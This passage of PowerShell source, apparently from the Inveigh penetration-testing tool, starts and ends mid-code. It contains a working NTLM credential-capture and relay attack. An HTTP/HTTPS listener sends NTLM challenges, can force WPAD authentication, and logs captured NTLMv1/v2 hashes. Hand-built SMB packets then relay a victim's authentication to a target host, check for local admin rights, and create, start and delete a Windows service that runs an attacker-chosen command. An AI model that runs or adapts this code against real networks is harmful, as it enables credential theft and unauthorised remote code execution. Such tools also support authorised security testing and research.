        [Byte[]]$SMB_relay_command_bytes = $SMB_relay_command.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
        
        $SMB_service_data_length_bytes = [BitConverter]::GetBytes($SMB_relay_command_bytes.length + 253)
        $SMB_service_data_length_bytes = $SMB_service_data_length_bytes[2..0]
        
        $SMB_service_byte_count_bytes = [BitConverter]::GetBytes($SMB_relay_command_bytes.length + 253 - 63)
        $SMB_service_byte_count_bytes = $SMB_service_byte_count_bytes[0..1]
        
        $SMB_relay_command_length_bytes = [BitConverter]::GetBytes($SMB_relay_command_bytes.length / 2)
        
        $k = 0

        :SMB_relay_execute_loop while ($k -lt 14)
        {
            switch ($k)
            {
            
                0 {
                    [Byte[]]$SMB_relay_execute_send = (0x00,0x00,0x00,0x45,0xff,0x53,0x4d,0x42,0x75,0x00,0x00,0x00,0x00,0x18,0x01,0x48)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0xff)`
                        + $inveigh.process_ID_bytes`
                        + $SMB_user_ID`
                        + (0x00,0x00,0x04,0xff,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x1a,0x00,0x00,0x5c,0x5c,0x31,0x30,0x2e,0x31)`
                        + (0x30,0x2e,0x32,0x2e,0x31,0x30,0x32,0x5c,0x49,0x50,0x43,0x24,0x00,0x3f,0x3f,0x3f,0x3f,0x3f,0x00)
                }
                  
                1 {
                    [Byte[]]$SMB_relay_execute_send = (0x00,0x00,0x00,0x5b,0xff,0x53,0x4d,0x42,0xa2,0x00,0x00,0x00,0x00,0x18,0x02,0x28)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08)`
                        + $inveigh.process_ID_bytes`
                        + $SMB_user_ID`
                        + (0x03,0x00,0x18,0xff,0x00,0x00,0x00,0x00,0x07,0x00,0x16,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)`
                        + (0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x01,0x00,0x00,0x00)`
                        + (0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x08,0x00,0x5c,0x73,0x76,0x63,0x63,0x74,0x6c,0x00)
                }
                
                2 {
                    [Byte[]]$SMB_relay_execute_send = (0x00,0x00,0x00,0x87,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,0x18,0x05,0x28)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08)`
                        + $inveigh.process_ID_bytes`
                        + $SMB_user_ID`
                        + (0x04,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0xea,0x03,0x00,0x00,0xff,0xff,0xff,0xff,0x08,0x00,0x48,0x00)`
                        + (0x00,0x00,0x48,0x00,0x3f,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x05,0x00,0x0b,0x03,0x10,0x00,0x00,0x00,0x48)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xd0,0x16,0xd0,0x16,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00)`
                        + (0x01,0x00,0x81,0xbb,0x7a,0x36,0x44,0x98,0xf1,0x35,0xad,0x32,0x98,0xf0,0x38,0x00,0x10,0x03,0x02,0x00,0x00)`
                        + (0x00,0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60,0x02,0x00,0x00,0x00)
                        
                        $SMB_multiplex_id = (0x05)
                }
               
                3 { 
                    [Byte[]]$SMB_relay_execute_send = $SMB_relay_execute_ReadAndRequest
                }
                
                4 {
                    [Byte[]] $SMB_relay_execute_send = (0x00,0x00,0x00,0x8f,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,0x18,0x05,0x28)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08)`
                        + $inveigh.process_ID_bytes`
                        + $SMB_user_ID`
                        + (0x06,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0xea,0x03,0x00,0x00,0xff,0xff,0xff,0xff,0x08,0x00,0x50)`
                        + (0x00,0x00,0x00,0x50,0x00,0x3f,0x00,0x00,0x00,0x00,0x00,0x50,0x00,0x05,0x00,0x00,0x03,0x10,0x00,0x00)`
                        + (0x00,0x50,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x38,0x00,0x00,0x00,0x00,0x00,0x0f,0x00,0x00,0x00,0x03)`
                        + (0x00,0x0f,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0f,0x00,0x00,0x00)`
                        + $SMB_machine_bytes`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x3f,0x00,0x0f,0x00)
                        
                        $SMB_multiplex_id = (0x07)
                }
                
                5 {  
                    [Byte[]]$SMB_relay_execute_send = $SMB_relay_execute_ReadAndRequest
                }
                
                6 {
                    [Byte[]]$SMB_relay_execute_send = [ARRAY](0x00)`
                        + $SMB_service_data_length_bytes`
                        + (0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,0x18,0x05,0x28)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08)`
                        + $inveigh.process_ID_bytes`
                        + $SMB_user_ID`
                        + (0x08,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0x9f,0x01,0x00,0x00,0xff,0xff,0xff,0xff,0x08,0x00)`
                        + $SMB_service_byte_count_bytes`
                        + (0x00,0x00)`
                        + $SMB_service_byte_count_bytes`
                        + (0x3f,0x00,0x00,0x00,0x00,0x00)`
                        + $SMB_service_byte_count_bytes`
                        + (0x05,0x00,0x00,0x03,0x10)`
                        + (0x00,0x00,0x00)`
                        + $SMB_service_byte_count_bytes`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x62,0x01,0x00,0x00,0x00,0x00,0x0c,0x00)`
                        + $SMB_context_handler`
                        + (0x0c,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0c,0x00,0x00,0x00)`
                        + $SMB_service_bytes`
                        + (0x21,0x03,0x03,0x00,0x11,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x11,0x00,0x00,0x00)`
                        + $SMB_service_display_bytes`
                        + (0x00,0x00,0xff,0x01,0x0f,0x00,0x10,0x01,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00)`
                        + $SMB_relay_command_length_bytes`
                        + (0x00,0x00,0x00,0x00)`
                        + $SMB_relay_command_length_bytes`
                        + $SMB_relay_command_bytes`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)
                        
                        $SMB_multiplex_id = (0x09)
                }

                7 {
                    [Byte[]]$SMB_relay_execute_send = $SMB_relay_execute_ReadAndRequest
                }
                
                8 {
                    [Byte[]]$SMB_relay_execute_send = (0x00,0x00,0x00,0x93,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,0x18,0x05,0x28)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08)`
                        + $inveigh.process_ID_bytes`
                        + $SMB_user_ID`
                        + (0x0a,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0x9f,0x01,0x00,0x00,0xff,0xff,0xff,0xff,0x08,0x00,0x54)`
                        + (0x00,0x00,0x00,0x54,0x00,0x3f,0x00,0x00,0x00,0x00,0x00,0x54,0x00,0x05,0x00,0x00,0x03,0x10,0x00,0x00)`
                        + (0x00,0x54,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x3c,0x00,0x00,0x00,0x00,0x00,0x10,0x00)`
                        + $SMB_context_handler`
                        + (0x0c,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0c,0x00,0x00,0x00)`
                        + $SMB_service_bytes`
                        + (0xff,0x01,0x0f,0x00)
                        
                        $SMB_multiplex_id = (0x0b)
                }
                
                9 {
                    [Byte[]]$SMB_relay_execute_send = $SMB_relay_execute_ReadAndRequest
                }
                
                10 {
                    [Byte[]]$SMB_relay_execute_send = (0x00,0x00,0x00,0x73,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,0x18,0x05,0x28)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08)`
                        + $inveigh.process_ID_bytes`
                        + $SMB_user_ID`
                        + (0x0a,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0x9f,0x01,0x00,0x00,0xff,0xff,0xff,0xff,0x08,0x00,0x34)`
                        + (0x00,0x00,0x00,0x34,0x00,0x3f,0x00,0x00,0x00,0x00,0x00,0x34,0x00,0x05,0x00,0x00,0x03,0x10,0x00,0x00)`
                        + (0x00,0x34,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x1c,0x00,0x00,0x00,0x00,0x00,0x13,0x00)`
                        + $SMB_context_handler`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)
                }
                
                11 {
                    [Byte[]]$SMB_relay_execute_send = $SMB_relay_execute_ReadAndRequest
                }
                
                12 { 
                    [Byte[]]$SMB_relay_execute_send = (0x00,0x00,0x00,0x6b,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,0x18,0x05,0x28)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08)`
                        + $inveigh.process_ID_bytes`
                        + $SMB_user_ID`
                        + (0x0b,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0x0b,0x01,0x00,0x00,0xff,0xff,0xff,0xff,0x08,0x00,0x2c)`
                        + (0x00,0x00,0x00,0x2c,0x00,0x3f,0x00,0x00,0x00,0x00,0x00,0x2c,0x00,0x05,0x00,0x00,0x03,0x10,0x00,0x00)`
                        + (0x00,0x2c,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x14,0x00,0x00,0x00,0x00,0x00,0x02,0x00)`
                        + $SMB_context_handler
                }
                13 {
                    [Byte[]]$SMB_relay_execute_send = $SMB_relay_execute_ReadAndRequest
                }
            }
            
            $SMB_relay_execute_stream.write($SMB_relay_execute_send, 0, $SMB_relay_execute_send.length)
            $SMB_relay_execute_stream.Flush()
            
            if($SMBRelayNetworkTimeout)
            {
                $SMB_relay_execute_timeout = new-timespan -Seconds $SMBRelayNetworkTimeout
                $SMB_relay_execute_stopwatch = [diagnostics.stopwatch]::StartNew()
                
                while(!$SMB_relay_execute_stream.DataAvailable)
                {
                    if($SMB_relay_execute_stopwatch.elapsed -ge $SMB_relay_execute_timeout)
                    {
                        $inveigh.console_queue.add("SMB relay target didn't respond within $SMBRelayNetworkTimeout seconds")
                        $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - SMB relay target didn't respond within $SMBRelayNetworkTimeout seconds")])
                        $inveigh.SMB_relay_active_step = 0
                        $SMB_relay_socket.Close()
                        break SMB_relay_execute_loop
                    }
                }
            }
            
            if ($k -eq 5) 
            {
                $SMB_relay_execute_stream.Read($SMB_relay_execute_bytes, 0, $SMB_relay_execute_bytes.length)
                $SMB_context_handler = $SMB_relay_execute_bytes[88..107]
                
                if($SMB_relay_execute_bytes[108] -eq 0)
                {
                    $inveigh.console_queue.add("$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is a local administrator on $SMBRelayTarget")
                    $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is a local administrator on $SMBRelayTarget")])
                    $SMB_relay_failed = $false
                }
                else
                {
                    $inveigh.console_queue.add("$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is not a local administrator on $SMBRelayTarget")
                    $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is not a local administrator on $SMBRelayTarget")])
                    $inveigh.SMBRelay_failed_list += "$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string $SMBRelayTarget"
                    $SMB_relay_failed = $true
                }
            }
            elseif (($k -eq 7) -or ($k -eq 11) -or ($k -eq 13))
            {
                $SMB_relay_execute_stream.Read($SMB_relay_execute_bytes, 0, $SMB_relay_execute_bytes.length)
                
                switch($k)
                {
                    7 {
                        $SMB_relay_execute_error_message = "Service creation fault context mismatch"
                    }
                    11 {
                        $SMB_relay_execute_error_message = "Service start fault context mismatch"
                    }
                    13 {
                        $SMB_relay_execute_error_message = "Service deletion fault context mismatch"
                    }
                }
                
                if([System.BitConverter]::ToString($SMB_relay_execute_bytes[88..91]) -eq ('1a-00-00-1c'))
                {
                    $inveigh.console_queue.add("$SMB_relay_execute_error_message service on $SMBRelayTarget")
                    $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - $SMB_relay_execute_error on $SMBRelayTarget")])
                    $SMB_relay_failed = $true
                }
                else
                {
                    if(!$SMB_relay_failed)
                    {
                        $SMB_relay_failed = $false
                    }
                }
            }
            elseif ($k -eq 9) 
            {
                $SMB_relay_execute_stream.Read($SMB_relay_execute_bytes, 0, $SMB_relay_execute_bytes.length)
                $SMB_context_handler = $SMB_relay_execute_bytes[88..107]
                
                if([System.BitConverter]::ToString($SMB_relay_execute_bytes[88..91]) -eq ('1a-00-00-1c')) # need better checks
                {
                    $inveigh.console_queue.add("Service open fault context mismatch on $SMBRelayTarget")
                    $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - Service open fault context mismatch on $SMBRelayTarget")])
                    $SMB_relay_failed = $true
                }
            }
            else
            {
                $SMB_relay_execute_stream.Read($SMB_relay_execute_bytes, 0, $SMB_relay_execute_bytes.length)    
            }
            
            if((!$SMB_relay_failed) -and ($k -eq 11))
            {
                $inveigh.console_queue.add("SMB relay command likely executed on $SMBRelayTarget")
                $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - SMB relay command likely executed on $SMBRelayTarget")])
            
                if($SMBRelayAutoDisable -eq 'y')
                {
                    $inveigh.SMB_relay = $false
                    $inveigh.console_queue.add("SMB relay auto disabled due to success")
                    $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - SMB relay auto disabled due to success")])
                }
            }
            elseif((!$SMB_relay_failed) -and ($k -eq 13))
            {
                $inveigh.console_queue.add("SMB relay command execution service deleted on $SMBRelayTarget")
                $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - SMB relay command execution service deleted on $SMBRelayTarget")])
                }   
            
            [Byte[]]$SMB_relay_execute_ReadAndRequest = (0x00,0x00,0x00,0x37,0xff,0x53,0x4d,0x42,0x2e,0x00,0x00,0x00,0x00,0x18,0x05,0x28)`
                + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08)`
                + $inveigh.process_ID_bytes`
                + $SMB_user_ID`
                + $SMB_multiplex_ID`
                + (0x00,0x0a,0xff,0x00,0x00,0x00,0x00,0x40,0x19,0x03,0x00,0x00,0xed,0x01,0xed,0x01,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00)
            
            $k++
        }
        
        $inveigh.SMB_relay_active_step = 0
        
        $SMB_relay_socket.Close()
        
    }
}

# HTTP/HTTPS Server ScriptBlock - HTTP/HTTPS listener
$HTTP_scriptblock = 
{
     
    param ($Challenge,$SMBRelay,$SMBRelayTarget,$SMBRelayCommand,$SMBRelayUsernames,$SMBRelayAutoDisable,$SMBRelayNetworkTimeout,$Repeat,$ForceWPADAuth)

    Function NTLMChallengeBase64
    {

        $HTTP_timestamp = Get-Date
        $HTTP_timestamp = $HTTP_timestamp.ToFileTime()
        $HTTP_timestamp = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_timestamp))
        $HTTP_timestamp = $HTTP_timestamp.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}

        if($Challenge)
        {
            $HTTP_challenge = $Challenge
            $HTTP_challenge_bytes = $Challenge.Insert(2,'-').Insert(5,'-').Insert(8,'-').Insert(11,'-').Insert(14,'-').Insert(17,'-').Insert(20,'-')
            $HTTP_challenge_bytes = $HTTP_challenge_bytes.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
        }
        else
        {
            $HTTP_challenge_bytes = [String](1..8 | % {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
            $HTTP_challenge = $HTTP_challenge_bytes -replace ' ', ''
            
            $HTTP_challenge_bytes = $HTTP_challenge_bytes.Split(" ") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
        }

        $inveigh.HTTP_challenge_queue.Add($inveigh.request.RemoteEndpoint.Address.IPAddressToString + $inveigh.request.RemoteEndpoint.Port + ',' + $HTTP_challenge) |Out-Null

        [byte[]]$HTTP_NTLM_bytes = (0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00,0x06,0x00,0x06,0x00,0x38,0x00,0x00,0x00,0x05,0x82,0x89,0xa2)`
            + $HTTP_challenge_bytes`
            + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x82,0x00,0x82,0x00,0x3e,0x00,0x00,0x00,0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f,0x4c,0x00,0x41,0x00,0x42,0x00)`
            + (0x02,0x00,0x06,0x00,0x4c,0x00,0x41,0x00,0x42,0x00,0x01,0x00,0x10,0x00,0x48,0x00,0x4f,0x00,0x53,0x00,0x54,0x00,0x4e,0x00,0x41,0x00,0x4d,0x00,0x45,0x00)`
            + (0x04,0x00,0x12,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,0x00,0x6c,0x00,0x03,0x00,0x24,0x00,0x68,0x00,0x6f,0x00)`
            + (0x73,0x00,0x74,0x00,0x6e,0x00,0x61,0x00,0x6d,0x00,0x65,0x00,0x2e,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,0x00)`
            + (0x6c,0x00,0x05,0x00,0x12,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,0x00,0x6c,0x00,0x07,0x00,0x08,0x00)`
            + $HTTP_timestamp`
            + (0x00,0x00,0x00,0x00,0x0a,0x0a)

        $NTLM_challenge_base64 = [System.Convert]::ToBase64String($HTTP_NTLM_bytes)
        $NTLM = 'NTLM ' + $NTLM_challenge_base64
        $NTLM_challenge = $HTTP_challenge

        Return $NTLM

    }
    
    while ($inveigh.running)
    {
        $inveigh.context = $inveigh.HTTP_listener.GetContext() 
        $inveigh.request = $inveigh.context.Request
        $inveigh.response = $inveigh.context.Response
        $inveigh.message = ''
        
        $NTLM = 'NTLM'
        
        if($inveigh.request.IsSecureConnection)
        {
            $HTTP_type = "HTTPS"
        }
        else
        {
            $HTTP_type = "HTTP"
        }
        
        
        if (($inveigh.request.RawUrl -match '/wpad.dat') -and ($ForceWPADAuth -eq 'n'))
        {
            $inveigh.response.StatusCode = 200
        }
        else
        {
            $inveigh.response.StatusCode = 401
        }
            
        [string]$authentication_header = $inveigh.request.headers.getvalues('Authorization')
        
        if($authentication_header.startswith('NTLM '))
        {
            $authentication_header = $authentication_header -replace 'NTLM ',''
            [byte[]] $HTTP_request_bytes = [System.Convert]::FromBase64String($authentication_header)
            $inveigh.response.StatusCode = 401
            
            if ($HTTP_request_bytes[8] -eq 1)
            {
                if(($inveigh.SMB_relay) -and ($inveigh.SMB_relay_active_step -eq 0) -and ($inveigh.request.RemoteEndpoint.Address -ne $SMBRelayTarget))
                {
                    $inveigh.SMB_relay_active_step = 1
                    $inveigh.console_queue.add("$HTTP_type to SMB relay triggered by " + $inveigh.request.RemoteEndpoint.Address + " at $(Get-Date -format 's')")
                    $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - $HTTP_type to SMB relay triggered by " + $inveigh.request.RemoteEndpoint.Address)])
                    $inveigh.console_queue.add("Grabbing challenge for relay from $SMBRelayTarget")
                    $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - Grabbing challenge for relay from " + $SMBRelayTarget)])
                    $SMB_relay_socket = New-Object System.Net.Sockets.TCPClient
                    $SMB_relay_socket.connect($SMBRelayTarget,"445")
                    
                    if(!$SMB_relay_socket.connected)
                    {
                        $inveigh.console_queue.add("$(Get-Date -format 's') - SMB relay target is not responding")
                        $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - SMB relay target is not responding")])
                        $inveigh.SMB_relay_active_step = 0
                    }
                    
                    if($inveigh.SMB_relay_active_step -eq 1)
                    {
                        $SMB_relay_bytes = SMBRelayChallenge $SMB_relay_socket $HTTP_request_bytes
                        $inveigh.SMB_relay_active_step = 2
                        $SMB_relay_bytes = $SMB_relay_bytes[2..$SMB_relay_bytes.length]
                        $SMB_user_ID = $SMB_relay_bytes[34..33]
                        $SMB_relay_NTLM_challenge = $SMB_relay_bytes[102..109]
                        $SMB_relay_target_details = $SMB_relay_bytes[118..257]
                        $SMB_relay_time = $SMB_relay_bytes[258..265]
                    
                        [byte[]] $HTTP_NTLM_bytes = (0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00,0x06,0x00,0x06,0x00,0x38,0x00,0x00,0x00,0x05,0x82,0x89,0xa2)`
                            + $SMB_relay_NTLM_challenge`
                            + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)`
                            + $SMB_relay_target_details`
                            + $SMB_relay_time`
                            + (0x00,0x00,0x00,0x00)
                    
                        $NTLM_challenge_base64 = [System.Convert]::ToBase64String($HTTP_NTLM_bytes)
                        $NTLM = 'NTLM ' + $NTLM_challenge_base64
                        $NTLM_challenge = SMBNTLMChallenge $SMB_relay_bytes
                        $inveigh.HTTP_challenge_queue.Add($inveigh.request.RemoteEndpoint.Address.IPAddressToString + $inveigh.request.RemoteEndpoint.Port + ',' + $NTLM_challenge)
                        $inveigh.console_queue.add("Received challenge $NTLM_challenge for relay from $SMBRelayTarget")
                        $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - Received challenge $NTLM_challenge for relay from $SMBRelayTarget")])
                        $inveigh.console_queue.add("Providing challenge $NTLM_challenge for relay to " + $inveigh.request.RemoteEndpoint.Address)
                        $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - Providing challenge $NTLM_challenge for relay to " + $inveigh.request.RemoteEndpoint.Address)])
                        $inveigh.SMB_relay_active_step = 3
                    }
                    else
                    {
                        $NTLM = NTLMChallengeBase64
                    }
                }
                else
                {
                     $NTLM = NTLMChallengeBase64
                }
                
                $inveigh.response.StatusCode = 401
                
            }
            elseif ($HTTP_request_bytes[8] -eq 3)
            {
                $NTLM = 'NTLM'
                $HTTP_NTLM_offset = $HTTP_request_bytes[24]
                $HTTP_NTLM_length = DataLength 22 $HTTP_request_bytes
                $HTTP_NTLM_domain_length = DataLength 28 $HTTP_request_bytes
                $HTTP_NTLM_domain_offset = DataLength 32 $HTTP_request_bytes
                
                [string]$NTLM_challenge = $inveigh.HTTP_challenge_queue -like $inveigh.request.RemoteEndpoint.Address.IPAddressToString + $inveigh.request.RemoteEndpoint.Port + '*'
                $inveigh.HTTP_challenge_queue.Remove($NTLM_challenge)
                $NTLM_challenge = $NTLM_challenge.Substring(($NTLM_challenge.IndexOf(","))+1)
                       
                if($HTTP_NTLM_domain_length -eq 0)
                {
                    $HTTP_NTLM_domain_string = ''
                }
                else
                {  
                    $HTTP_NTLM_domain_string = DataToString $HTTP_NTLM_domain_length 0 0 $HTTP_NTLM_domain_offset $HTTP_request_bytes
                } 
                    
                $HTTP_NTLM_user_length = DataLength 36 $HTTP_request_bytes
                $HTTP_NTLM_user_string = DataToString $HTTP_NTLM_user_length $HTTP_NTLM_domain_length 0 $HTTP_NTLM_domain_offset $HTTP_request_bytes
                        
                $HTTP_NTLM_host_length = DataLength 44 $HTTP_request_bytes
                $HTTP_NTLM_host_string = DataToString $HTTP_NTLM_host_length $HTTP_NTLM_domain_length $HTTP_NTLM_user_length $HTTP_NTLM_domain_offset $HTTP_request_bytes
        
                if($HTTP_NTLM_length -eq 24) # NTLMv1
                {
                    $NTLM_type = "NTLMv1"
                    $NTLM_response = [System.BitConverter]::ToString($HTTP_request_bytes[($HTTP_NTLM_offset - 24)..($HTTP_NTLM_offset + $HTTP_NTLM_length)]) -replace "-",""
                    $NTLM_response = $NTLM_response.Insert(48,':')
                    $inveigh.HTTP_NTLM_hash = $HTTP_NTLM_user_string + "::" + $HTTP_NTLM_domain_string + ":" + $NTLM_response + ":" + $NTLM_challenge
                    
                    if(($NTLM_challenge -ne '') -and ($NTLM_response -ne ''))
                    {    
                        
                        $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - $HTTP_type NTLMv1 challenge/response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string captured from " + $inveigh.request.RemoteEndpoint.Address + "(" + $HTTP_NTLM_host_string + ")")])
                        $inveigh.NTLMv1_file_queue.add($inveigh.HTTP_NTLM_hash)
                        $inveigh.NTLMv1_list.add($inveigh.HTTP_NTLM_hash)
                        $inveigh.console_queue.add("$(Get-Date -format 's') - $HTTP_type NTLMv1 challenge/response captured from " + $inveigh.request.RemoteEndpoint.Address + "(" + $HTTP_NTLM_host_string + "):`n" + $inveigh.HTTP_NTLM_hash)
                        
                        if($inveigh.file_output)
                        {
                            $inveigh.console_queue.add("$HTTP_type NTLMv1 challenge/response written to " + $inveigh.NTLMv1_out_file)
                        }                   
                        
                    }
                    
                    if (($inveigh.IP_capture_list -notcontains $inveigh.request.RemoteEndpoint.Address) -and (-not $HTTP_NTLM_user_string.EndsWith('$')) -and ($Repeat -eq 'n'))
                    {
                        $inveigh.IP_capture_list += $inveigh.request.RemoteEndpoint.Address
                    }
                }
                else # NTLMv2
                {   
                    $NTLM_type = "NTLMv2"           
                    $NTLM_response = [System.BitConverter]::ToString($HTTP_request_bytes[$HTTP_NTLM_offset..($HTTP_NTLM_offset + $HTTP_NTLM_length)]) -replace "-",""
                    $NTLM_response = $NTLM_response.Insert(32,':')
                    $inveigh.HTTP_NTLM_hash = $HTTP_NTLM_user_string + "::" + $HTTP_NTLM_domain_string + ":" + $NTLM_challenge + ":" + $NTLM_response
                    
                    if(($NTLM_challenge -ne '') -and ($NTLM_response -ne ''))
                    {
                        $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add($(Get-Date -format 's') + " - $HTTP_type NTLMv2 challenge/response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string captured from " + $inveigh.request.RemoteEndpoint.address + "(" + $HTTP_NTLM_host_string + ")")])
                        $inveigh.NTLMv2_file_queue.add($inveigh.HTTP_NTLM_hash)
                        $inveigh.NTLMv2_list.add($inveigh.HTTP_NTLM_hash)
                        $inveigh.console_queue.add($(Get-Date -format 's') + " - $HTTP_type NTLMv2 challenge/response captured from " + $inveigh.request.RemoteEndpoint.address + "(" + $HTTP_NTLM_host_string + "):`n" + $inveigh.HTTP_NTLM_hash)
                        
                        if($inveigh.file_output)
                        {
                            $inveigh.console_queue.add("$HTTP_type NTLMv2 challenge/response written to " + $inveigh.NTLMv2_out_file)
                        }
                        
                    }
                    
                    if (($inveigh.IP_capture_list -notcontains $inveigh.request.RemoteEndpoint.Address) -and (-not $HTTP_NTLM_user_string.EndsWith('$')) -and ($Repeat -eq 'n'))
                    {
                        $inveigh.IP_capture_list += $inveigh.request.RemoteEndpoint.Address
                    }
                }
                
                $inveigh.response.StatusCode = 200
                $NTLM_challenge = ''
                
                if (($inveigh.SMB_relay) -and ($inveigh.SMB_relay_active_step -eq 3))
                {
                    if((!$SMBRelayUsernames) -or ($SMBRelayUsernames -contains $HTTP_NTLM_user_string) -or ($SMBRelayUsernames -contains "$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string"))
                    {
                        if($inveigh.SMBRelay_failed_list -notcontains "$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string $SMBRelayTarget")
                        {
                            if($NTLM_type -eq 'NTLMv2')
                            {
                                $inveigh.console_queue.add("Sending $NTLM_type response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string for relay to $SMBRelaytarget")
                                $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - Sending $NTLM_type response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string for relay to $SMBRelaytarget")])
                                $SMB_relay_response_return_bytes = SMBRelayResponse $SMB_relay_socket $HTTP_request_bytes $SMB_user_ID
                                $SMB_relay_response_return_bytes = $SMB_relay_response_return_bytes[1..$SMB_relay_response_return_bytes.length]
                    
